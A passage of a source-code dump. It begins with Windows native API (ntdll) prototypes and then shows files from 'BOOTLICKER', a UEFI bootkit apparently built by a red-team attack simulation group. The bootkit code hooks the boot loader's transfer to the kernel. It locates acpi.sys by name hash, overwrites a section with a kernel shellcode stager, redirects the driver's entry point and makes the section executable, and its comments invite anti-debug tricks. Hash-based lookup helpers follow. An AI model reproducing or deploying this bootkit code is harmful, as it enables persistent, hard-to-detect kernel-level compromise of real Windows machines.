    ULONG Sequence;      // Sequence number for this event
    ULONG TimeDateStamp; // Time and date of image
    ULONG CheckSum;      // Image checksum
    WCHAR ImageName[32]; // Image name
} RTL_UNLOAD_EVENT_TRACE32, *PRTL_UNLOAD_EVENT_TRACE32;

PRTL_UNLOAD_EVENT_TRACE
NTAPI
RtlGetUnloadEventTrace(
    VOID
    );

NTSTATUS
NTAPI
RtlInitializeProfile(
    BOOLEAN KernelToo
    );

typedef BOOLEAN
(NTAPI *
PRTL_IS_THREAD_WITHIN_LOADER_CALLOUT)(
    VOID
    );

BOOLEAN
NTAPI
RtlIsThreadWithinLoaderCallout (
    VOID
    );

NTSTATUS
NTAPI
RtlSetLFHDebuggingInformation(
	PVOID LFHHeap,
	PHEAP_DEBUGGING_INFORMATION DebuggingInformation
	);

ULONG
NTAPI
RtlMultipleAllocateHeap (
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN SIZE_T Size,
    IN ULONG Count,
    OUT PVOID * Array
    );

ULONG
NTAPI
RtlMultipleFreeHeap (
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN ULONG Count,
    OUT PVOID * Array
    );

NTSTATUS
NTAPI
RtlNewSecurityObjectEx (
    IN PSECURITY_DESCRIPTOR ParentDescriptor OPTIONAL,
    IN PSECURITY_DESCRIPTOR CreatorDescriptor OPTIONAL,
    OUT PSECURITY_DESCRIPTOR * NewDescriptor,
    IN GUID *ObjectType OPTIONAL,
    IN BOOLEAN IsDirectoryObject,
    IN ULONG AutoInheritFlags,
    IN HANDLE Token,
    IN PGENERIC_MAPPING GenericMapping
    );

NTSTATUS
NTAPI
RtlNewSecurityObjectWithMultipleInheritance (
    IN PSECURITY_DESCRIPTOR ParentDescriptor OPTIONAL,
    IN PSECURITY_DESCRIPTOR CreatorDescriptor OPTIONAL,
    OUT PSECURITY_DESCRIPTOR * NewDescriptor,
    IN GUID **pObjectType OPTIONAL,
    IN ULONG GuidCount,
    IN BOOLEAN IsDirectoryObject,
    IN ULONG AutoInheritFlags,
    IN HANDLE Token,
    IN PGENERIC_MAPPING GenericMapping
    );

#if !defined(_WINDOWS_)
NTSTATUS
NTAPI
RtlSetHeapInformation (
    IN PVOID HeapHandle,
    IN HEAP_INFORMATION_CLASS HeapInformationClass,
    IN PVOID HeapInformation OPTIONAL,
    IN SIZE_T HeapInformationLength OPTIONAL
    );

NTSTATUS
NTAPI
RtlQueryHeapInformation (
    IN PVOID HeapHandle,
    IN HEAP_INFORMATION_CLASS HeapInformationClass,
    OUT PVOID HeapInformation OPTIONAL,
    IN SIZE_T HeapInformationLength OPTIONAL,
    OUT PSIZE_T ReturnLength OPTIONAL
    );
#endif

NTSTATUS
NTAPI
RtlQuerySecurityObject (
     PSECURITY_DESCRIPTOR ObjectDescriptor,
     SECURITY_INFORMATION SecurityInformation,
     PSECURITY_DESCRIPTOR ResultantDescriptor,
     ULONG DescriptorLength,
     PULONG ReturnLength
     );

NTSTATUS
NTAPI
RtlRegisterWait(
    OUT PHANDLE WaitHandle,
    IN  HANDLE  Handle,
    IN  WAITORTIMERCALLBACKFUNC Function,
    IN  PVOID Context,
    IN  ULONG  Milliseconds,
    IN  ULONG  Flags
    );

ULONG
NTAPI
RtlRemoveVectoredContinueHandler (
    IN PVOID Handle
    );

ULONG
NTAPI
RtlRemoveVectoredExceptionHandler (
    IN PVOID Handle
    );

NTSTATUS
NTAPI
RtlSetIoCompletionCallback(
    IN  HANDLE  FileHandle,
    IN  APC_CALLBACK_FUNCTION  CompletionProc,
    IN  ULONG Flags
    );

NTSTATUS
NTAPI
RtlSetSecurityObject(
    SECURITY_INFORMATION SecurityInformation,
    PSECURITY_DESCRIPTOR ModificationDescriptor,
    PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor,
    PGENERIC_MAPPING GenericMapping,
    HANDLE Token
    );

NTSTATUS
NTAPI
RtlSetSecurityObjectEx(
    IN SECURITY_INFORMATION SecurityInformation,
    IN PSECURITY_DESCRIPTOR ModificationDescriptor,
    IN OUT PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor,
    IN ULONG AutoInheritFlags,
    IN PGENERIC_MAPPING GenericMapping,
    IN HANDLE Token OPTIONAL
    );

typedef ULONG (NTAPI RTLP_UNHANDLED_EXCEPTION_FILTER) (
    struct _EXCEPTION_POINTERS *ExceptionInfo
    );

typedef RTLP_UNHANDLED_EXCEPTION_FILTER *PRTLP_UNHANDLED_EXCEPTION_FILTER;

VOID
RtlSetUnhandledExceptionFilter (
    PRTLP_UNHANDLED_EXCEPTION_FILTER UnhandledExceptionFilter
    );

NTSTATUS
NTAPI
RtlStartProfile (
    VOID
    );

NTSTATUS
NTAPI
RtlStopProfile (
    VOID
    );

NTSTATUS
RtlWow64EnableFsRedirection(
    IN BOOLEAN Wow64FsEnableRedirection
    );


NTSTATUS
RtlWow64EnableFsRedirectionEx(
    IN PVOID Wow64FsEnableRedirection,
    OUT PVOID *OldFsRedirectionLevel
    );

NTSTATUS
NTAPI
RtlRegisterWait(
    OUT PHANDLE WaitHandle,
    IN  HANDLE  Handle,
    IN  WAITORTIMERCALLBACKFUNC Function,
    IN  PVOID Context,
    IN  ULONG  Milliseconds,
    IN  ULONG  Flags
    );

NTSTATUS
NTAPI
RtlDeregisterWait(
    IN HANDLE WaitHandle
    );

NTSTATUS
NTAPI
RtlDeregisterWaitEx(
    IN HANDLE WaitHandle,
    IN HANDLE Event
    );

#define RtlEqualMemory(Destination,Source,Length) (!memcmp((Destination),(Source),(Length)))
#define RtlMoveMemory(Destination,Source,Length) memmove((Destination),(Source),(Length))
#define RtlCopyMemory(Destination,Source,Length) memcpy((Destination),(Source),(Length))
#define RtlFillMemory(Destination,Length,Fill) memset((Destination),(Fill),(Length))
#define RtlZeroMemory(Destination,Length) memset((Destination),0,(Length))

typedef
VOID
(*PKNORMAL_ROUTINE)
(IN PVOID NormalContext,
 IN PVOID SystemArgument1,
 IN PVOID SystemArgument2
 );

VOID
KiUserCallbackDispatcher(
	IN ULONG ApiNumber,
	IN PVOID InputBuffer,
	IN ULONG INputLength
	);

NTSTATUS
NTAPI
CsrClientConnectToServer(
    IN PWSTR ObjectDirectory,
    IN ULONG ServertDllIndex,
    IN PCSR_CALLBACK_INFO CallbackInformation OPTIONAL,
    IN PVOID ConnectionInformation,
    IN OUT PULONG ConnectionInformationLength OPTIONAL,
    OUT PBOOLEAN CalledFromServer OPTIONAL
    );


NTSTATUS
NTAPI
CsrClientCallServer(
    IN OUT PCSR_API_MSG m,
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer OPTIONAL,
    IN CSR_API_NUMBER ApiNumber,
    IN ULONG ArgLength
    );


PCSR_CAPTURE_HEADER
NTAPI
CsrAllocateCaptureBuffer(
    IN ULONG CountMessagePointers,
    IN ULONG CountCapturePointers,
    IN ULONG Size
    );

VOID
NTAPI
CsrFreeCaptureBuffer(
    IN PCSR_CAPTURE_HEADER CaptureBuffer
    );


ULONG
NTAPI
CsrAllocateMessagePointer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN ULONG Length,
    OUT PVOID *Pointer
    );

VOID
NTAPI
CsrCaptureMessageBuffer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PVOID Buffer OPTIONAL,
    IN ULONG Length,
    OUT PVOID *CapturedBuffer
    );

VOID
NTAPI
CsrCaptureMessageString(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PCSTR String,
    IN ULONG Length,
    IN ULONG MaximumLength,
    OUT PSTRING CapturedString
    );

PLARGE_INTEGER
NTAPI
CsrCaptureTimeout(
    IN ULONG Milliseconds,
    OUT PLARGE_INTEGER Timeout
    );

VOID
NTAPI
CsrProbeForWrite(
    IN PVOID Address,
    IN ULONG Length,
    IN ULONG Alignment
    );

VOID
NTAPI
CsrProbeForRead(
    IN PVOID Address,
    IN ULONG Length,
    IN ULONG Alignment
    );

NTSTATUS
NTAPI
CsrNewThread(
    VOID
    );

NTSTATUS
NTAPI
CsrIdentifyAlertableThread(
    VOID
    );

NTSTATUS
NTAPI
CsrSetPriorityClass(
    IN HANDLE ProcessHandle,
    IN OUT PULONG PriorityClass
    );

//added 20/03/2011
NTSTATUS
NTAPI
RtlCreateProcessReflection(
	IN HANDLE ProcessHandle,
	IN ULONG Flags,
	IN OPTIONAL PVOID StartRoutine,
	IN OPTIONAL PVOID StartContext,
	IN OPTIONAL HANDLE EventHandle,
	OUT OPTIONAL PRTL_PROCESS_REFLECTION_INFORMATION ReflectionInformation
	);


NTSTATUS
NTAPI
RtlCloneUserProcess(
	IN ULONG ProcessFlags,
	IN OPTIONAL PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
	IN OPTIONAL PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
	IN OPTIONAL HANDLE DebugPort,
	OUT PRTL_USER_PROCESS_INFORMATION ProcessInformation
	);


VOID
NTAPI
LdrShutdownProcess(
	);

NTSTATUS
NTAPI
RtlQueryProcessModuleInformation(
    IN HANDLE hProcess OPTIONAL,
    IN ULONG Flags,
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessBackTraceInformation(
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessHeapInformation(
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessLockInformation(
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

PRTL_DEBUG_INFORMATION
NTAPI
RtlCreateQueryDebugBuffer(
    IN ULONG MaximumCommit OPTIONAL,
    IN BOOLEAN UseEventPair
    );

NTSTATUS
NTAPI
RtlDestroyQueryDebugBuffer(
    IN PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessDebugInformation(
    IN HANDLE UniqueProcessId,
    IN ULONG Flags,
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlCreateTimer(
    IN HANDLE TimerQueueHandle,
    OUT HANDLE *Handle,
    IN WAITORTIMERCALLBACKFUNC Function,
    IN PVOID Context,
    IN ULONG DueTime,
    IN ULONG Period,
    IN ULONG Flags
    );

NTSTATUS
NTAPI
RtlUpdateTimer(
    IN HANDLE TimerQueueHandle,
    IN HANDLE TimerHandle,
    IN ULONG  DueTime,
    IN ULONG  Period
    );

NTSTATUS
NTAPI
RtlDeleteTimer(
    IN HANDLE TimerQueueHandle,
    IN HANDLE TimerToCancel,
    IN HANDLE Event
    );

NTSTATUS
NTAPI
RtlDeleteTimerQueue(
    IN HANDLE TimerQueueHandle
    );

NTSTATUS
NTAPI
RtlDeleteTimerQueueEx(
    IN HANDLE TimerQueueHandle,
    IN HANDLE Event
    );


BOOLEAN
NTAPI
RtlDoesFileExists_U(
    PCWSTR FileName
    );


ULONG
RtlGetCurrentDirectory_U(
	ULONG nBufferLength,
	PWSTR lpBuffer
	);

NTSTATUS
RtlSetCurrentDirectory_U(
	PUNICODE_STRING PathName
	);


ULONG
RtlDosSearchPath_U(
	IN PWSTR lpPath,
	IN PWSTR lpFileName,
	IN PWSTR lpExtension OPTIONAL,
	IN ULONG nBufferLength,
	OUT PWSTR lpBuffer,
	OUT PWSTR *lpFilePart
	);


void
NTAPI
RtlInitString(
    PSTRING DestinationString,
    PCSZ SourceString
    );

ULONG
NTAPI
RtlGetFullPathName_U(
    IN PCWSTR lpFileName,
    IN ULONG nBufferLength,
    OUT PWSTR lpBuffer,
    OUT OPTIONAL PWSTR *lpFilePart
    );

LONG
NTAPI
RtlCompareString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );


NTSTATUS
NTAPI
LdrRegisterDllNotification(
	IN ULONG Flags,
	IN PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
	IN PVOID Context,
	OUT PVOID *Cookie
	);


NTSTATUS
NTAPI
LdrUnregisterDllNotification(
	IN PVOID Cookie
	);


ULONG
NTAPI
EtwRegisterSecurityProvider();

ULONG
NTAPI
EtwWriteUMSecurityEvent(
    PCEVENT_DESCRIPTOR EventDescriptor,
    USHORT EventProperty,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData);


ULONG
NTAPI
EtwEventWriteEndScenario(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);

ULONG
NTAPI
EtwEventWriteFull(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	USHORT EventProperty,
	LPCGUID ActivityId,
	LPCGUID RelatedActivityId,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);


ULONG
NTAPI
EtwEventWriteStartScenario(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);


//
// old channel apis, from nt4
//

NTSTATUS
NTAPI
NtCreateChannel (
    OUT PHANDLE ChannelHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL
    );

NTSTATUS
NTAPI
NtOpenChannel (
    OUT PHANDLE ChannelHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );

NTSTATUS
NTAPI
NtListenChannel (
    IN HANDLE ChannelHandle,
    OUT PCHANNEL_MESSAGE *Message
	);

NTSTATUS
NTAPI
NtSendWaitReplyChannel (
    IN HANDLE ChannelHandle,
    IN PVOID Text,
    IN ULONG Length,
    OUT PCHANNEL_MESSAGE *Message
    );

NTSTATUS
NTAPI
NtReplyWaitSendChannel (
    IN PVOID Text,
    IN ULONG Length,
    OUT PCHANNEL_MESSAGE *Message
    );


ULONG
NTAPI
AlpcUnregisterCompletionListWorkerThread(
		PVOID CompletionList
		);


void
NTAPI
RtlUpdateClonedCriticalSection(
		PRTL_CRITICAL_SECTION CriticalSection
		);

NTSTATUS
NTAPI
RtlGetFullPathName_UstrEx(
		PUNICODE_STRING FileName,
		PUNICODE_STRING StaticString,
		PUNICODE_STRING DynamicString,
		PPUNICODE_STRING StringUsed,
		PULONG FilePartPrefixCch,
		PUCHAR NameInvalid,
		PRTL_PATH_TYPE InputPathType,
		PULONG BytesRequired);

int
NTAPI
LdrInitShimEngineDynamic(
		PVOID pShimEngineModule);

NTSTATUS
NTAPI
NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG TitleIndex,
    IN OPTIONAL PUNICODE_STRING Class,
    IN ULONG CreateOptions,
    OUT OPTIONAL PULONG Disposition
    );

NTSTATUS
NTAPI
NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN OPTIONAL ULONG TitleIndex,
    IN ULONG Type,
    IN OPTIONAL PVOID Data,
    IN ULONG DataSize
    );

NTSTATUS
NTAPI
NtDeleteFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );

NTSTATUS
RtlGetVersion(
	OUT PRTL_OSVERSIONINFOW lpVersionInformation
	);
		
NTSTATUS
NTAPI
ZwWow64QueryInformationProcess64(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
ZwWow64QueryVirtualMemory64(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );


NTSTATUS
NTAPI
ZwWow64ReadVirtualMemory64(
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );


NTSTATUS
NTAPI
ZwWow64WriteVirtualMemory64(
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN CONST VOID *Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );

void
NTAPI
ZwWow64GetCurrentProcessorNumberEx(
		OUT PPROCESSOR_NUMBER ProcNumber
);

PCSR_CAPTURE_HEADER
NTAPI
ZwWow64CsrAllocateCaptureBuffer(
    IN ULONG CountMessagePointers,
    IN ULONG CountCapturePointers,
    IN ULONG Size
    );

ULONG
NTAPI
ZwWow64CsrAllocateMessagePointer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN ULONG Length,
    OUT PVOID *Pointer
    );

void
NTAPI
ZwWow64CsrCaptureMessageBuffer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PVOID Buffer OPTIONAL,
    IN ULONG Length,
    OUT PVOID *CapturedBuffer
    );

void
NTAPI
ZwWow64CsrCaptureMessageString(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PCSTR String,
    IN ULONG Length,
    IN ULONG MaximumLength,
    OUT PSTRING CapturedString
    );

NTSTATUS
NTAPI
ZwWow64CsrClientConnectToServer(
    IN PWSTR ObjectDirectory,
    IN ULONG ServerDllIndex,
    IN PCSR_CALLBACK_INFO CallbackInformation OPTIONAL,
    IN PVOID ConnectionInformation,
    IN OUT PULONG ConnectionInformationLength OPTIONAL,
    OUT PBOOLEAN CalledFromServer OPTIONAL
    );

void
NTAPI
ZwWow64CsrFreeCaptureBuffer(
    IN PCSR_CAPTURE_HEADER CaptureBuffer
    );

NTSTATUS
NTAPI
ZwWow64CsrIdentifyAlertableThread( 
    void
    );

NTSTATUS
NTAPI
ZwWow64DebuggerCall (
    IN ULONG ServiceClass,
    IN ULONG Arg1,
    IN ULONG Arg2
    );

NTSTATUS
NTAPI
RtlCleanUpTEBLangLists(
		void
		);

VOID
KiUserApcDispatcher (
	PVOID NormalContext,
	PVOID SystemArgument1,
	PVOID SystemArgument2,
	PKNORMAL_ROUTINE NormalRoutine
	);

VOID
KiUserExceptionDispatcher (
	PEXCEPTION_RECORD ExceptionRecord,
	PCONTEXT ContextFrame
	);

NTSTATUS
NTAPI
NtCreateDebugObject(
	OUT PHANDLE DebugObjectHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN ULONG Flags
	);

NTSTATUS
NTAPI
NtDebugActiveProcess(
	IN HANDLE ProcessHandle,
	IN HANDLE DebugObjectHandle
	);

NTSTATUS
NTAPI
NtDebugContinue(
	IN HANDLE DebugObjectHandle,
	IN PCLIENT_ID ClientId,
	IN NTSTATUS ContinueStatus
	);

NTSTATUS
NTAPI
NtRemoveProcessDebug(
	IN HANDLE ProcessHandle,
	IN HANDLE DebugObjectHandle
	);

NTSTATUS
NTAPI
NtSetInformationDebugObject(
	IN HANDLE DebugObjectHandle,
	IN DEBUGOBJECTINFOCLASS DebugObjectInformationClass,
	IN PVOID DebugInformation,
	IN ULONG DebugInformationLength,
	OUT OPTIONAL PULONG ReturnLength
	);

NTSTATUS
NTAPI
NtWaitForDebugEvent(
	IN HANDLE DebugObjectHandle,
	IN BOOLEAN Alertable,
	IN OPTIONAL PLARGE_INTEGER Timeout,
	OUT PVOID WaitStateChange
	);

// Debugging UI

NTSTATUS
NTAPI
DbgUiConnectToDbg(
	VOID
	);

HANDLE
NTAPI
DbgUiGetThreadDebugObject(
	VOID
	);

VOID
NTAPI
DbgUiSetThreadDebugObject(
	IN HANDLE DebugObject
	);

NTSTATUS
NTAPI
DbgUiWaitStateChange(
	OUT PDBGUI_WAIT_STATE_CHANGE StateChange,
	IN OPTIONAL PLARGE_INTEGER Timeout
	);

NTSTATUS
NTAPI
DbgUiContinue(
	IN PCLIENT_ID AppClientId,
	IN NTSTATUS ContinueStatus
	);

NTSTATUS
NTAPI
DbgUiStopDebugging(
	IN HANDLE Process
	);

NTSTATUS
NTAPI
DbgUiDebugActiveProcess(
	IN HANDLE Process
	);

VOID
NTAPI
DbgUiRemoteBreakin(
	IN PVOID Context
	);

NTSTATUS
NTAPI
DbgUiIssueRemoteBreakin(
	IN HANDLE Process
	);

VOID
NTAPI
RtlExitUserProcess(
	IN NTSTATUS ExitStatus
	);

NTSTATUS
NTAPI
RtlQueueWorkItem(
	IN WORKERCALLBACKFUNC CallbackFunction,
	IN OPTIONAL PVOID Context,
	IN ULONG Flags
	);


NTSTATUS
NTAPI
RtlCreateUserStack(
	SIZE_T CommittedStackSize,
	SIZE_T MaximumStackSize,
	SIZE_T ZeroBits,
	ULONG PageSize,
	ULONG ReserveAlignment,
	PINITIAL_TEB InitialTeb
	);


LRESULT
NTAPI
NtdllDefWindowProc_W(
	);


LRESULT
NTAPI
NtdllDefWindowProc_A(
	);


NTSTATUS
NTAPI
LdrQueryProcessModuleInformation(
	PRTL_PROCESS_MODULES ModuleInformation,
	ULONG ModuleInformationLength,
	PULONG ReturnLength
	);


//
// end non-crt prototypes
//


//
// nt crt
//
//please do not change swprintf stuff otherwise win32 mode is always trashed
#if !defined(_NO_NTDLL_CRT_)
int __cdecl vsprintf( char *, const char *, va_list );
int __cdecl _vsnprintf( char *, size_t, const char *, va_list );
int __cdecl sprintf( char *, const char *, ... );
int __cdecl _snprintf( char *, size_t, const char *, ... );
int __cdecl _snwprintf( wchar_t *, size_t, const wchar_t *, ... );
int __cdecl swprintf( wchar_t *, const wchar_t *, ... );
int __cdecl sscanf( const char *, const char *, ... );
int __cdecl _vscwprintf( const wchar_t *, va_list );
int __cdecl _vsnwprintf( wchar_t *, size_t, const wchar_t *, va_list );

//readded 4 jan 2012
//win64 mode does not need this
//for using this routines ntdllp.lib is required
#if !defined(_M_X64)
IMPORT_FN size_t __cdecl wcslen(const wchar_t *);
IMPORT_FN wchar_t * __cdecl wcscat(wchar_t *dst, const wchar_t *src);
IMPORT_FN int __cdecl wcscmp(const wchar_t *src, const wchar_t *dst);
IMPORT_FN int __cdecl _wcsicmp(const wchar_t *, const wchar_t *);
IMPORT_FN int __cdecl _wcsnicmp(const wchar_t *, const wchar_t *, size_t);
IMPORT_FN wchar_t * __cdecl _wcslwr(wchar_t *);
IMPORT_FN wchar_t * __cdecl _wcsupr(wchar_t *);
IMPORT_FN wchar_t * __cdecl wcschr(const wchar_t *string, wchar_t ch);
IMPORT_FN wchar_t * __cdecl wcscpy(wchar_t *dst, const wchar_t *src);
IMPORT_FN wchar_t * __cdecl wcsncat(wchar_t *front, const wchar_t *back, size_t count);
IMPORT_FN wchar_t * __cdecl wcsncpy(wchar_t *dest, const wchar_t *source, size_t count);
#endif //_M_X64

#endif	// _NO_NTDLL_CRT_

#ifdef __cplusplus
}
#endif


#endif /* _NTDLL_ */

```

`bootkit/OslArchTransferToKernel.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	ULONG		OsMajorVersion;
	ULONG		OsMinorVersion;
	ULONG		Length;
	ULONG		Reserved;
	LIST_ENTRY	LoadOrderListHead;
	LIST_ENTRY	MEmoryDescriptorListHead;
	LIST_ENTRY	BootDriverListHead;
} PARAMETER_BLOCK, *PPARAMETER_BLOCK ;

/*!
 *
 * Purpose:
 *
 * Inserts a kernel shellcode stager into ACPI.SYS
 * .rsrc section, and directs execution to it.
 *
 * Maybe do some anti-debug here? You have control
 * over the entire boot process. Get creative.
 *
!*/
D_SEC( B ) VOID EFIAPI OslArchTransferToKernelHook( _In_ PVOID LoaderBlock, _In_ PVOID Entry )
{
	SIZE_T			Len = 0;
	PEFTBL			Eft = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PPARAMETER_BLOCK	Blk = NULL;
	PIMAGE_DOS_HEADER	Ntd = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	/* Get EfiTable address */
	Eft = C_PTR( G_PTR( EfTbl ) );
	Blk = C_PTR( LoaderBlock );

	/* Initialize list values */
	Hdr = & Blk->LoadOrderListHead;
	Ent = Hdr->Flink;

	/* Enumerate the list to completion */
	while ( C_PTR( Ent ) != C_PTR( Hdr ) ) {

		/* Get the LDR_DATA_TABLE_ENTRY */
		Ldr = CONTAINING_RECORD( Ent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );

		/* Is this acpi.sys? */
		if ( HashString( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length ) == 0x5dc8930f ) {
			Dos = C_PTR( Ldr->DllBase );
			Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
			Sec = IMAGE_FIRST_SECTION( Nth );

			/* Enumerate all the PE Sections */
			for ( INT Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
				/* Is this a .text section? */
				if ( HashString( & Sec[ Idx ].Name, 0 ) == 0x0b6dca4d ) {

					/* Locate the ntoskrnl image base */
					Ntd = C_PTR( U_PTR( U_PTR( Entry ) &~ ( 0x1000 - 1 ) ) );
					while ( Ntd->e_magic != IMAGE_DOS_SIGNATURE ) {
						/* Decrement by a page! */
						Ntd = C_PTR( U_PTR( Ntd ) - 0x1000 );
					};

					/* Store information for DrvMain to retrieve */
					Eft->KernelBuf                 = C_PTR( G_PTR( EfiMain ) );
					Eft->KernelLen                 = U_PTR( ( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( EfiMain ) ) );
					Eft->KernelBase                = C_PTR( Ntd );
					Eft->TgtDrvImgSect             = C_PTR( & Sec[ Idx ] );
					Eft->TgtDrvImgBase             = C_PTR( Ldr->DllBase );
					Eft->TgtDrvLdrEntry            = C_PTR( Ldr );
					Eft->TgtDrvAddressOfEntrypoint = Nth->OptionalHeader.AddressOfEntryPoint;

					/* Find the total length of the buffer */
					Len = C_PTR( U_PTR( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( DrvMain ) ) );

					/* Insert DrvMainStart */
					__builtin_memcpy( C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress ), C_PTR( G_PTR( DrvMain ) ), Len );

					/* Insert a hook! */
					Ldr->EntryPoint                         = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );
					Nth->OptionalHeader.AddressOfEntryPoint = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );

					/* Set -x permission in section */
					Sec[ Idx ].Characteristics |= IMAGE_SCN_MEM_EXECUTE;

					/* Break! */
					break;
				};
			};
			/* Break! */
			break;
		};

		/* Next entry */
		Ent = C_PTR( Ent->Flink );
	};

	/* Execute original OslArchTransferToKernel stub and callgate */
	( ( __typeof__( OslArchTransferToKernelHook ) * ) Eft->OslArchTransferToKernelGate )( LoaderBlock, Entry );
};

```

`bootkit/OslArchTransferToKernel.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Inserts a kernel shellcode stager into ACPI.SYS
 * .rsrc section, and directs execution to it.
 *
!*/
D_SEC( B ) VOID EFIAPI OslArchTransferToKernelHook( _In_ PVOID LoaderBlock, _In_ PVOID Entry );

```

`core/Common.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

#include <windows.h>
#include <intrin.h>
#include "global/Macros.h"
#include "global/Hash.h"

```

`core/Hash.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Returns a DJB2 hash representation of an input buffer
 * of the specified length. If no length is provided, it
 * assumes it is a NULL terminated string.
 *
!*/
D_SEC( H ) UINT32 HashString( _In_ PVOID Buffer, _In_ UINT32 Length )
{
	UINT8	Val = 0;
	UINT32	Djb = 0;
	PUINT8	Buf = NULL;

	Djb = 5381;
	Buf = C_PTR( Buffer );

	while ( TRUE ) {
		/* Get the current character */
		Val = * Buf;

		if ( ! Length ) {
			/* NULL Terminated */
			if ( ! * Buf ) {
				/* Abort! */
				break;
			};
		} else 
		{
			/* Is the current position exceed the length of the buffer? */
			if ( ( UINT32 )( Buf - ( PUINT8 ) Buffer ) >= Length ) {
				break;
			};
			/* NULL Terminated */
			if ( ! * Buf ) {
				/* Increment and move onto the next */
				++Buf; continue;
			};
		};
		/* Lowercase */
		if ( Val >= 'a' ) {
			/* Decrement to uppercase */
			Val -= 0x20;
		};

		/* Hash the current character */
		Djb = ( ( Djb << 5 ) + Djb ) + Val; ++Buf;
	};

	/* Return the hash */
	return Djb;
};

```

`core/Pe.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Searches for an export in a PE.
 *
!*/
D_SEC( H ) PVOID PeGetFuncEat( _In_ PVOID ImageBase, _In_ UINT32 ExportHash )
{
	PUINT16			Aoo = NULL;
	PUINT32			Aon = NULL;
	PUINT32			Aof = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;
	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;

	/* Get address to headers */
	Dos = C_PTR( ImageBase );
